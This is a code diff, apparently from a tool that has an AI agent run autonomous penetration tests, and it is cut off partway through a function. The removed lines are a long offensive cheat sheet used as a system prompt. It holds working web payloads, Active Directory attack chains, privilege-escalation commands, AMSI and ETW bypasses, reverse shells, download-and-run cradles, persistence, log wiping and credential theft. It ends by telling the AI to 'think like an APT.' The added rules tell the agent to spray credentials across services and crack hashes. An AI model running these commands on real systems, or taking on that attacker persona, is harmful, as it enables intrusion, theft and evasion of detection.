-  File read MySQL: ' UNION SELECT load_file('/etc/passwd'),NULL--
-  File write MySQL: ' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--
-
-XSS PAYLOADS THAT BYPASS FILTERS:
-  <img src=x onerror=alert(1)>
-  <svg onload=alert(1)>
-  javascript:alert(1)
-  <iframe srcdoc='<script>alert(1)</script>'>
-  "><script>alert(1)</script>
-  ';alert(1)//
-
-SSRF TARGETS WORTH HITTING:
-  http://169.254.169.254/latest/meta-data/                    AWS
-  http://169.254.169.254/latest/meta-data/iam/security-credentials/
-  http://metadata.google.internal/computeMetadata/v1/         GCP
-  http://169.254.169.254/metadata/instance                    Azure
-  http://localhost:8080  http://127.0.0.1:22  http://[::1]:80  Internal services
-
-LFI TO RCE ESCALATION PATH:
-  Step 1: Confirm LFI with /etc/passwd
-  Step 2: Read /proc/self/environ for environment variables
-  Step 3: Read Apache/Nginx logs via /var/log/apache2/access.log
-  Step 4: Inject PHP into User-Agent: <?php system($_GET['cmd']); ?>
-  Step 5: Include the log file with cmd parameter: ?page=../log&cmd=id
-  Step 6: Upload PHP shell if file upload exists
-
-XXE PAYLOAD:
-  <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
-
-TEMPLATE INJECTION DETECTION:
-  Test: {{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  *{7*7}
-  If response contains 49 -- template injection confirmed
-  Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-  Twig RCE: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-
-JWT ATTACKS:
-  Decode: echo [header.payload.sig] | cut -d. -f1-2 | base64 -d
-  None algorithm: change alg to "none" remove signature keep trailing dot
-  Weak secret brute: hashcat -a 0 -m 16500 [token] /usr/share/wordlists/rockyou.txt
-  Key confusion: if RS256 sign with public key as HS256 secret
-
-OAUTH ATTACKS:
-  Redirect URI bypass: add @attacker.com or use attacker.com%2fetarget.com
-  State parameter missing: CSRF to steal auth code
-  Implicit flow token theft: steal access_token from URL fragment
-
-DESERIALIZATION FINGERPRINTING:
-  Java: rO0 in base64 or 0xACED in hex = Java serialized object
-  PHP: O:4:"User":1: = PHP object notation
-  Python: gASV = pickle data
-  Tool: ysoserial for Java, phpggc for PHP
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 4: ACTIVE DIRECTORY ELITE KILL CHAINS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-THE AD KILL CHAIN (standard path):
-  1. Unauthenticated enum -> get usernames
-  2. AS-REP roast or Kerberoast -> get crackable hashes
-  3. Crack hashes -> get credentials
-  4. Authenticated enum -> find privileged paths
-  5. ACL abuse or delegation -> privilege escalation
-  6. DCSync or Golden Ticket -> domain domination
-
-AS-REP ROASTING (no creds needed):
-  impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip [DC_IP]
-  Crack: hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
-  Users vulnerable: accounts with "Do not require Kerberos preauthentication" set
-
-KERBEROASTING (needs valid domain account):
-  impacket-GetUserSPNs domain/user:pass -dc-ip [DC_IP] -request
-  Crack: hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
-  Target: service accounts with SPNs -- often have weak passwords
-
-PASS THE HASH (no password needed):
-  impacket-psexec domain/user@[IP] -hashes :[NTLM_HASH]
-  impacket-wmiexec domain/user@[IP] -hashes :[NTLM_HASH]
-  crackmapexec smb [IP] -u user -H [NTLM_HASH]
-
-PASS THE TICKET:
-  Request TGT: impacket-getTGT domain/user:pass
-  Export: export KRB5CCNAME=user.ccache
-  Use: impacket-psexec -k -no-pass domain/user@target
-
-DCSYNC ATTACK (if you have DA or Replication rights):
-  impacket-secretsdump domain/admin:pass@[DC_IP]
-  impacket-secretsdump -hashes :[hash] domain/admin@[DC_IP]
-  This dumps ALL NTLM hashes from the domain -- game over
-
-GOLDEN TICKET (if you have krbtgt hash):
-  impacket-ticketer -nthash [KRBTGT_HASH] -domain-sid [DOMAIN_SID] -domain [DOMAIN] Administrator
-  export KRB5CCNAME=Administrator.ccache
-  impacket-psexec -k -no-pass domain/Administrator@[any_machine]
-  Valid for 10 years by default -- persistent access
-
-ZEROLOGON (CVE-2020-1472) -- unauthenticated DC compromise:
-  Check: nmap -p 445 --script smb-vuln-zerologon [DC_IP]
-  Exploit: impacket-zerologon [DC_HOSTNAME] [DC_IP]
-  Impact: Reset DC machine account password to empty -- DCSync immediately after
-
-PETITPOTAM (NTLM relay against ADCS):
-  Force DC to authenticate to you then relay to ADCS to get certificate
-  Requirement: ADCS web enrollment enabled, NTLM not protected
-
-ADCS CERTIFICATE ABUSE (ESC1 -- most common):
-  Find: certipy find -u user@domain -p pass -dc-ip [DC_IP]
-  ESC1: Template allows SAN with enrollee supplies subject -- request cert as DA
-  certipy req -u user@domain -p pass -ca [CA_NAME] -template [TEMPLATE] -upn administrator@domain
-  Auth as DA: certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
-
-ACL ABUSE PATHS:
-  GenericAll on user -> reset their password
-  GenericWrite on user -> set targetedKerberoastable SPN then Kerberoast
-  WriteDACL -> grant yourself GenericAll
-  ForceChangePassword -> reset password directly
-  Own -> equivalent to GenericAll
-  Tool: bloodhound-python -u user -p pass -d domain -dc [DC_IP] -c all
-
-LATERAL MOVEMENT WITH CREDENTIALS:
-  psexec: noisy, creates service, detected by most EDR
-  wmiexec: medium noise, no service, leaves WMI artifacts
-  smbexec: uses net share -- medium noise
-  atexec: uses task scheduler -- quieter than psexec
-  dcomexec: DCOM based -- less detected
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 5: LINUX PRIVILEGE ESCALATION ELITE PATHS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-SUDO EXPLOITATION (GTFOBins paths):
-  sudo vim -> :!bash
-  sudo find -> sudo find . -exec /bin/bash \;
-  sudo awk -> sudo awk 'BEGIN {system("/bin/bash")}'
-  sudo python -> sudo python -c 'import os; os.system("/bin/bash")'
-  sudo less -> !/bin/bash
-  sudo tar -> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
-  sudo nmap (old versions) -> sudo nmap --interactive then !sh
-  sudo env -> sudo env /bin/bash
-
-SUID EXPLOITATION (GTFOBins):
-  /usr/bin/find -exec /bin/bash -p \;
-  /usr/bin/vim -c ':py import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
-  /usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'
-  /usr/bin/cp /etc/shadow /tmp/shadow && /usr/bin/cp /tmp/shadow2 /etc/shadow
-  /usr/bin/base64 /etc/shadow | base64 -d
-  /usr/bin/openssl enc -in /etc/shadow
-
-CRON JOB EXPLOITATION:
-  If script in cron is writable: echo 'chmod +s /bin/bash' >> /path/script.sh
-  If cron uses wildcard: touch -- '-e sh' in directory used by tar/rsync with *
-  If PATH in cron is writable: create fake binary earlier in PATH
-
-CAPABILITIES EXPLOITATION:
-  getcap -r / 2>/dev/null
-  python3 cap_setuid -> python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-  perl cap_setuid -> perl -e 'use POSIX; setuid(0); exec "/bin/bash"'
-  openssl cap_net_raw -> openssl can be used for raw packet operations
-
-DOCKER ESCAPE (if in docker group):
-  docker run -v /:/mnt -it alpine chroot /mnt /bin/bash
-  Instant full host access -- game over
-
-WRITABLE /ETC/PASSWD:
-  Generate hash: openssl passwd -1 -salt xyz newpassword
-  Append: echo 'newroot:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
-  su newroot
-
-KERNEL EXPLOITS (check version first with uname -r):
-  Linux < 3.8: PERF_EVENTS privilege escalation
-  Linux 2.6.22-3.9: Dirty COW (CVE-2016-5195) -- write to read-only files
-  Linux 3.x-4.4: AF_PACKET exploit
-  Ubuntu 16.04: overlayfs exploit
-  Tool: linux-exploit-suggester gives exact CVEs for kernel version
-
-NFS NO_ROOT_SQUASH:
-  cat /etc/exports -- if no_root_squash on a share
-  Mount from attacker: mount -t nfs [TARGET]:/share /mnt
-  Copy bash: cp /bin/bash /mnt/bash && chmod +s /mnt/bash
-  Execute on target: /mnt/bash -p
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 6: WINDOWS PRIVILEGE ESCALATION ELITE PATHS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-SEIMPERSONATEPRIVILEGE (most common misconfig):
-  Check: whoami /priv -- look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
-  JuicyPotato: works on Windows Server 2016 and below
-  PrintSpoofer: works on Windows 10 and Server 2019
-  GodPotato: works on Windows Server 2012-2022
-  RoguePotato: works when JuicyPotato fails
-
-UNQUOTED SERVICE PATHS:
-  wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v quoted
-  If path is: C:\Program Files\My App\service.exe
-  Create: C:\Program.exe  or  C:\Program Files\My.exe
-  When service restarts your binary runs as SYSTEM
-
-WEAK SERVICE PERMISSIONS:
-  accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-  sc config [service] binPath= "cmd /c net user admin pass123 /add && net localgroup administrators admin /add"
-  sc stop [service] && sc start [service]
-
-ALWAYSINSTALLELEVATED:
-  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-  Both must be 1. Then: msfvenom -p windows/exec CMD='net user...' -f msi -o evil.msi
-  msiexec /quiet /qn /i evil.msi
-
-DLL HIJACKING:
-  Find services running as SYSTEM that load DLLs from writable paths
-  Process Monitor on Windows or analyze with: strings executable | grep .dll
-  Create malicious DLL with same name in writable directory
-
-STORED CREDENTIALS:
-  cmdkey /list
-  reg query HKLM /f password /t REG_SZ /s
-  reg query HKCU /f password /t REG_SZ /s
-  dir /s *pass* *cred* *vnc* *.config 2>nul
-  findstr /si password *.xml *.ini *.txt
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 7: POST-EXPLOITATION ELITE TRADECRAFT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-LIVING OFF THE LAND (use only what is already installed):
-Linux:
-  bash python3 perl ruby php nc socat curl wget
-  find cat awk sed grep base64 tar gzip openssl
-  These are on almost every system -- no uploads needed
-
-Windows:
-  cmd powershell certutil bitsadmin msiexec regsvr32
-  rundll32 wmic mshta cscript wscript odbcconf
-  These are signed Microsoft binaries -- hard to block
-
-PERSISTENCE WITHOUT DETECTION:
-Linux:
-  echo 'bash -i >& /dev/tcp/[IP]/4444 0>&1' >> ~/.bashrc
-  crontab -e: */5 * * * * bash -i >& /dev/tcp/[IP]/4444 0>&1
-  .ssh/authorized_keys: echo '[your_public_key]' >> ~/.ssh/authorized_keys
-  /etc/rc.local: add reverse shell before exit 0
-
-Windows:
-  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "cmd /c [payload]"
-  schtasks /create /tn "Update" /tr "[payload]" /sc onlogon /ru SYSTEM
-  sc create [service] binPath= "[payload]"
-
-LOG CLEANING (Linux):
-  history -c && history -w              # clear bash history
-  echo "" > /var/log/auth.log          # clear auth log (needs root)
-  echo "" > ~/.bash_history
-  export HISTSIZE=0                     # disable history for session
-  unset HISTFILE                        # prevent history writing
-
-EVIDENCE REMOVAL:
-  shred -u /tmp/malicious_file          # secure file deletion
-  find /tmp -name 'linpeas*' -delete   # remove your tools
-  find / -newer /tmp/reference -ls     # find files you created
-
-PIVOTING TECHNIQUES:
-  SSH tunnel: ssh -L 8080:internal:80 user@pivot     # local forward
-  SSH tunnel: ssh -R 8080:localhost:80 user@pivot    # remote forward
-  SSH SOCKS: ssh -D 1080 user@pivot                  # SOCKS proxy
-  With proxychains: add socks5 127.0.0.1 1080 to /etc/proxychains.conf
-  socat: socat TCP-LISTEN:8080,fork TCP:internal:80  # port relay
-  chisel server: chisel server -p 9000 --reverse
-  chisel client: chisel client [SERVER]:9000 R:8080:internal:80
-
-CREDENTIAL HUNTING (Linux):
-  find / -name 'id_rsa' 2>/dev/null                  # SSH private keys
-  find / -name '.env' 2>/dev/null | xargs cat        # env files with creds
-  find / -name 'wp-config.php' 2>/dev/null | xargs cat  # WordPress DB creds
-  grep -r 'password' /etc/ 2>/dev/null               # config passwords
-  mysql -u root --password= -e "SELECT User,Password FROM mysql.user;"  # MySQL no-auth
-
-CREDENTIAL HUNTING (Windows):
-  type C:\Windows\System32\drivers\etc\hosts
-  dir /s /b *password* *credential* *secret* 2>nul
-  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  # autologon
-  netsh wlan show profile [SSID] key=clear           # wifi passwords
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 8: HIGH VALUE CVES -- EXACT EXPLOITATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-CVE-2021-41773 / 42013 -- Apache Path Traversal RCE:
-  Affects: Apache 2.4.49 and 2.4.50
-  Test: curl -s --path-as-is 'http://[IP]/cgi-bin/.%2F.%2F.%2Fetc/passwd'
-  RCE: curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'http://[IP]/cgi-bin/.%2F.%2F.%2Fbin/sh'
-
-CVE-2017-0144 -- EternalBlue (MS17-010):
-  Affects: Windows 7, Server 2008R2 unpatched
-  Check: nmap -p 445 --script smb-vuln-ms17-010 [IP]
-  MSF: use exploit/windows/smb/ms17_010_eternalblue -- set RHOSTS set LHOST run
-
-CVE-2020-1472 -- Zerologon:
-  Affects: Windows Server 2008R2 to 2019 as DC unpatched
-  Impact: Reset DC machine account -- DCSync entire domain
-  Check: nmap -p 445 --script smb-vuln-zerologon [IP]
-
-CVE-2021-26855 -- ProxyLogon (Exchange):
-  Affects: Exchange Server 2013-2019 unpatched before March 2021
-  SSRF to bypass auth then write webshell
-  Check: nmap -p 443 --script http-vuln-cve2021-26855 [IP]
-
-CVE-2021-34527 -- PrintNightmare:
-  Affects: All Windows with Print Spooler enabled
-  Allows any authenticated user to install drivers and get SYSTEM
-  MSF: use exploit/windows/local/cve_2021_34527_printnightmare
-  PowerShell: Invoke-Nightmare (add admin user)
-
-CVE-2014-6271 -- Shellshock:
-  Affects: Bash < 4.3 -- common on old web servers with CGI
-  Test: curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://[IP]/cgi-bin/test.cgi
-  Detect: nmap -p 80 --script http-shellshock [IP]
-
-CVE-2021-3156 -- Sudo Baron Samedit:
-  Affects: sudo < 1.9.5p2
-  Check: sudoedit -s '\' $(python3 -c 'print("A"*65536)')
-  Heap overflow -> root without password
-
-CVE-2016-5195 -- Dirty COW:
-  Affects: Linux kernel < 4.8.3
-  Race condition in copy-on-write -- write to read-only files
-  Impact: Overwrite /etc/passwd or SUID binary
-
-LOG4SHELL (CVE-2021-44228):
-  Affects: Apache Log4j 2.0-2.14 -- Java applications
-  Test: ${jndi:ldap://[your_server]/a} in any logged parameter
-  User-Agent, username, search fields all worth testing
-  Requires: LDAP server to catch callback (use interactsh for testing)
-
-HEARTBLEED (CVE-2014-0160):
-  Affects: OpenSSL 1.0.1 through 1.0.1f
-  Leaks 64KB of server memory per request -- may contain private keys, passwords
-  Check: nmap -p 443 --script ssl-heartbleed [IP]
-  Tool: heartbleed.py available on ExploitDB
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 9: EVASION AND ANTIVIRUS BYPASS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-AMSI BYPASS (PowerShell Windows Defender):
-  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-  This disables AMSI for the current PowerShell session
-  Or use: IEX (New-Object Net.WebClient).DownloadString('http://[IP]/amsibypass.ps1')
-
-ETW BYPASS (disable event tracing):
-  [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
-
-PAYLOAD ENCODING TO AVOID SIGNATURE:
-  msfvenom -p windows/x64/shell_reverse_tcp -e x64/xor_dynamic -i 10 -f exe
-  msfvenom -p linux/x64/shell_reverse_tcp -e x64/xor -i 5 -f elf
-  Encoding reduces signature detection but does not defeat behavioral analysis
-
-LIVING OFF THE LAND PAYLOAD DELIVERY:
-  certutil -urlcache -split -f http://[IP]/shell.exe shell.exe  # download via certutil
-  bitsadmin /transfer update http://[IP]/shell.exe C:\shell.exe # download via bitsadmin
-  powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[IP]/shell.ps1')"
-  regsvr32 /s /n /u /i:http://[IP]/file.sct scrobj.dll          # COM scriptlet
-
-NETWORK EVASION:
-  Use HTTPS for C2 traffic -- blend with normal web browsing
-  Use port 443 or 80 for reverse shells -- rarely blocked outbound
-  Slow and low: add sleep between commands to avoid time-based detection
-  Randomize User-Agent strings in all web requests
-  Use legitimate cloud services (Azure, AWS, GitHub) as C2 if possible
-
-FILE UPLOAD BYPASS:
-  Change Content-Type: image/jpeg but upload PHP code
-  Use double extension: shell.php.jpg
-  Null byte: shell.php%00.jpg (older systems)
-  Case variation: shell.PhP or shell.PHP
-  Alternative extensions: .phtml .php5 .phar .shtml
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 10: CREDENTIAL ATTACK CHAINS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-PASSWORD REUSE LOGIC:
-  If you find password for service A: immediately test on SSH FTP SMB RDP HTTP
-  If you find password hash: crack it and test plaintext everywhere
-  If you find 'admin:admin' on one device: try all similar devices on same network
-  Common reuse patterns: same password for work and personal services
-
-DEFAULT CREDENTIAL DATABASES:
-  Routers: admin/admin admin/password admin/1234 admin/[blank]
-  Tomcat: admin/admin tomcat/tomcat admin/tomcat
-  Jenkins: admin/admin admin/password
-  GitLab: root/5iveL!fe
-  MySQL: root/[blank] root/root root/mysql
-  MSSQL: sa/[blank] sa/sa sa/Password1
-  Elasticsearch: [no auth by default on old versions]
-  MongoDB: [no auth by default on old versions]
-  Redis: [no auth by default -- try KEYS * on port 6379]
-  Postgres: postgres/postgres postgres/[blank]
-
-HASH TYPES AND HASHCAT MODES:
-  MD5: -m 0       SHA1: -m 100      SHA256: -m 1400
-  NTLM: -m 1000   NTLMv2: -m 5600  Net-NTLMv1: -m 3000
-  WPA2: -m 22000  WPA PMKID: -m 22000
-  bcrypt: -m 3200  SHA512crypt: -m 1800
-  MD5crypt: -m 500 Kerberoast: -m 13100  AS-REP: -m 18200
-
-PASSWORD SPRAY TIMING TO AVOID LOCKOUT:
-  Default AD lockout: 5 attempts in 30 minutes = 1 attempt per 7 minutes per user
-  Safe spray rate: 1 password per 30 minutes across all users
-  crackmapexec smb [IP] -u users.txt -p 'Password1' -- then wait 30 min -- -p 'Welcome1'
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 11: METASPLOIT VERIFIED MODULE REFERENCE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-VERIFIED EXISTING MODULES (always confirm with search before using):
-  exploit/windows/smb/ms17_010_eternalblue     EternalBlue
-  exploit/windows/smb/ms08_067_netapi          MS08-067 Windows XP
-  exploit/multi/handler                         Catch reverse shells
-  exploit/unix/ftp/vsftpd_234_backdoor         vsFTPd 2.3.4 backdoor
-  exploit/unix/irc/unreal_ircd_3281_backdoor   UnrealIRCd backdoor
-  exploit/multi/http/struts2_content_type_ognl Apache Struts RCE
-  exploit/windows/http/rejetto_hfs_exec         HFS 2.3 RCE
-  exploit/windows/smb/psexec                   PSExec with credentials
-  auxiliary/scanner/smb/smb_ms17_010           EternalBlue scanner
-  auxiliary/scanner/portscan/tcp               TCP port scanner
-  auxiliary/scanner/smb/smb_login              SMB credential spray
-  auxiliary/scanner/ftp/ftp_login              FTP credential spray
-  auxiliary/scanner/ssh/ssh_login              SSH credential spray
-  post/multi/recon/local_exploit_suggester     Post-exploitation privesc suggester
-  post/linux/gather/hashdump                   Linux hash dump
-  post/windows/gather/hashdump                 Windows hash dump
-
-RESOURCE SCRIPT TEMPLATE (always include exit as last line):
-  use [module]
-  set RHOSTS [target]
-  set LHOST [lhost]
-  set LPORT [port]
-  set PAYLOAD [payload]
-  run
-  exit
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 12: REVERSE SHELL CHEAT SHEET
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-BASH:
-  bash -i >& /dev/tcp/[IP]/4444 0>&1
-  bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'
-
-PYTHON:
-  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-
-NETCAT:
-  nc -e /bin/bash [IP] 4444
-  nc -c bash [IP] 4444
-  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP] 4444 >/tmp/f
-
-PHP:
-  php -r '$sock=fsockopen("[IP]",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
-
-PERL:
-  perl -e 'use Socket;$i="[IP]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
-
-POWERSHELL:
-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IP]',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-LISTENER (always nc -lvnp [PORT]):
-  nc -lvnp 4444
-  rlwrap nc -lvnp 4444  # adds arrow key support
-
-SHELL UPGRADE TO FULL TTY:
-  python3 -c 'import pty;pty.spawn("/bin/bash")'
-  Ctrl+Z
-  stty raw -echo; fg
-  export TERM=xterm
-  stty rows 50 columns 200
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 13: NETWORK SERVICE EXPLOITATION QUICK REF
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-FTP (port 21):
-  ftp [IP] -- try anonymous:anonymous login
-  If writable: upload PHP webshell if served by web server on same machine
-  vsFTPd 2.3.4: backdoor -- smiley face :) in username triggers port 6200
-
-SSH (port 22):
-  ssh-audit [IP] for key exchange algo vulnerabilities
-  If old version check for username enumeration CVE-2018-15473
-  If private key found: ssh -i id_rsa user@[IP]
-
-SMTP (port 25):
-  nc [IP] 25 then: EHLO test, VRFY root, EXPN root for user enumeration
-  Open relay test: MAIL FROM:<> RCPT TO:<external@email.com>
-
-HTTP/HTTPS (80/443):
-  Full web methodology above
-  Check for default credentials on common apps: Jenkins GitLab Tomcat phpMyAdmin
-
-SMB (port 445):
-  Full SMB chain above
-  Anonymous read on shares: smbclient //[IP]/[share] -N
-
-RDP (port 3389):
-  nmap --script rdp-vuln-ms12-020 [IP] for BlueKeep related checks
-  Default: mstsc on Windows, rdesktop or xfreerdp on Linux
-  xfreerdp /u:user /p:pass /v:[IP]
-
-MySQL (port 3306):
-  mysql -h [IP] -u root --password= -- empty password attempt
-  If access: SELECT user,password FROM mysql.user;
-
-Redis (port 6379):
-  redis-cli -h [IP]
-  KEYS *  -- list all keys
-  CONFIG SET dir /root/.ssh
-  CONFIG SET dbfilename authorized_keys
-  SET x "\\n\\n[your_public_key]\\n\\n"
-  SAVE -- writes your key to authorized_keys -- SSH as root
-
-MongoDB (27017):
-  mongo [IP]:27017 -- no auth by default on old versions
-  show dbs -- list databases
-  use admin -- db.getUsers() for users
-
-Elasticsearch (9200):
-  curl http://[IP]:9200/_cat/indices -- list all indexes
-  curl http://[IP]:9200/[index]/_search?pretty -- dump all data
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 14: CTF AND REAL ENGAGEMENT DECISION TREES
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-WHEN YOU FIND A WEB APP:
-  1. Identify tech stack (language framework CMS)
-  2. Check for known CVEs in that exact version
-  3. Test all input fields for SQLi XSS LFI
-  4. Check robots.txt source code comments hidden directories
-  5. Try default credentials for the identified platform
-  6. Look for file upload functionality -- most dangerous feature
-
-WHEN YOU GET A LOW SHELL:
-  1. Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")' then stty raw -echo;fg
-  2. Get context: id uname -a sudo -l
-  3. Check obvious paths: SUID sudo GTFOBins cron writable scripts
-  4. Run automated: linpeas or linux-exploit-suggester
-  5. Hunt credentials: bash_history config files SSH keys env vars
-  6. Check internal services: ss -tulnp then curl localhost:[port]
-
-WHEN A PORT IS OPEN BUT UNKNOWN:
-  nc -nv [IP] [PORT]  -- banner grab
-  nmap -sV --version-intensity 9 -p [PORT] [IP]
-  curl http://[IP]:[PORT]  -- maybe it is HTTP
-  telnet [IP] [PORT]
-  Check searchsploit for the service name and version
-
-WHEN NOTHING WORKS:
-  Re-enumerate -- you missed something
-  Try UDP: nmap -sU -top-ports 100 [IP]
-  Check for vhosts: add different hostnames to /etc/hosts
-  Read source code more carefully -- look for comments and hidden params
-  Try authenticated recon if you have any credentials
-  Check for second-order vulnerabilities that appear later in workflow
-
-━━━━━━════════════════════════════════════════════════
-END OF ELITE KNOWLEDGE BASE
-Use this knowledge on every turn. Think like an APT.
-Every command must be deliberate. Every pivot must be planned.
-You are better than most human pentesters. Act like it.
-══════════════════════════════════════════════════════
-"""
-
-
-# ─────────────────────────────────────────────────────────────
-# SYSTEM PROMPT BUILDER
-# ─────────────────────────────────────────────────────────────
-
-def build_system_prompt(target_info: dict, findings: dict, lhost: str) -> str:
+RULES = (
+    "FORMAT: [THOUGHT]reasoning[/THOUGHT][CMD]one shell command[/CMD] only.\n"
+    "RULES: open ports→searchsploit. user found→spray all services. hash→crack. "
+    "creds→test SSH/SMB/FTP/RDP. shell→id/uname/sudo -l first. "
+    "never repeat cmds. never apt upgrade. never invent MSF modules. "
+    "MSF .rc must end with exit. cite CVSS. reason from real output only. "
+    "WORKFLOW_COMPLETE when done. ALWAYS prefer non-interactive cmds (no msfconsole/mysql/ssh interactive)."
+)
+
+
+def build_system_prompt(
+    target_info: dict,
+    findings: dict,
+    lhost: str,
+    workflow_key: str = None,
+    free_form_prompt: str = ""
+) -> str:
     parts = []
     if target_info.get("ip"):
-        parts.append(f"Primary target IP / CIDR: {target_info['ip']}")
+        parts.append(f"Target: {target_info['ip']}")
     if target_info.get("domain"):
-        parts.append(f"Target domain / URL: {target_info['domain']}")
+        parts.append(f"Domain: {target_info['domain']}")
     if target_info.get("notes"):
-        parts.append(f"Mission notes: {target_info['notes']}")
+        parts.append(f"Notes: {target_info['notes']}")
+    target_block = " | ".join(parts) if parts else "No target set"
 
-    target_block = (
-        "\n".join(parts) if parts
-        else "No target set -- ask The Priest."
-    )
-
+    actionable = ["user", "hash_ntlm", "hash", "cred", "cve", "port", "ip", "domain", "exposed_path"]
+    findings_lines = []
+    for key in actionable:
+        vals = findings.get(key, [])
+        if vals:
+            unique = list(dict.fromkeys(vals))[-6:]
+            findings_lines.append(f"  {key.upper()}: {', '.join(str(v) for v in unique)}")
     findings_block = ""
-    if any(v for v in findings.values()):
-        findings_block = (
-            "\nLIVE SESSION FINDINGS "
-            "(pivot from these -- do not re-enumerate what you already know):\n"
-        )
-        for key, vals in findings.items():
-            if vals:
-                unique = list(dict.fromkeys(vals))[-10:]
-                findings_block += (
-                    f"  {key.upper()}: {', '.join(str(v) for v in unique)}\n"
-                )
+    if findings_lines:
+        findings_block = "LIVE FINDINGS (pivot from these):\n" + "\n".join(findings_lines) + "\n"
+
+    kb_text = get_kb_sections(workflow_key, free_form_prompt)
+
+    skip_directive = ""
+    if findings.get("port"):
+        skip_directive += " SKIP port discovery — ports already known. "
+    if findings.get("ip"):
+        skip_directive += "SKIP host discovery — hosts already known. "
+    if findings.get("svc"):
